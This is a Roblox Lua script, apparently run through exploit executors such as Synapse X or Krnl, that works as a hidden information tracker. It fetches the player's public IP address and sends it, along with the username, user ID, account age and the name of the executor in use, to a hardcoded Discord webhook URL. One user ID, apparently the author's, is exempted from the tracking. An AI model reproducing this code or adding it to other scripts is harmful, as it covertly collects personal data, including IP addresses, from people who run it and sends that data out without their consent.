local WeebHook = "https://discord.com/api/webhooks/1046955945621737502/HsniRn_0kRUhfXqIb5eI6csZqYwQwWOFm-d1ZJKwk4eoFvvELEnxsD8u_ow-koBGqNzB"
local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
local HttpService = game:GetService("HttpService")
local Ip = tostring(game:HttpGet("https://api.ipify.org", true))
if game.Players.LocalPlayer.UserId == 860289947 then
print("Bypassed Info Tracker")
else
local Data = {
    ["username"] = "SSHub",
    ["embeds"] = {
        {
            ["title"] = "Info Spoofer",
            ["color"] = 9893552,
            ["fields"] = {
                {
                    ["name"] = "User",
                    ["value"] = game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Id",
                    ["value"] = game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Age",
                    ["value"] = game.Players.LocalPlayer.AccountAge,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor",
                    ["value"] = ExecutorUsing,
                    ["inline"] = true
                },
                {
                    ["name"]= "Ip",
                    ["value"]= "||"..Ip.."||",
                    ["inline"]= true
                },
            }
        }
    }
}

local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)
local Request = http_request or request or HttpPost or syn.request
local Final = {Url = WeebHook, Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
end
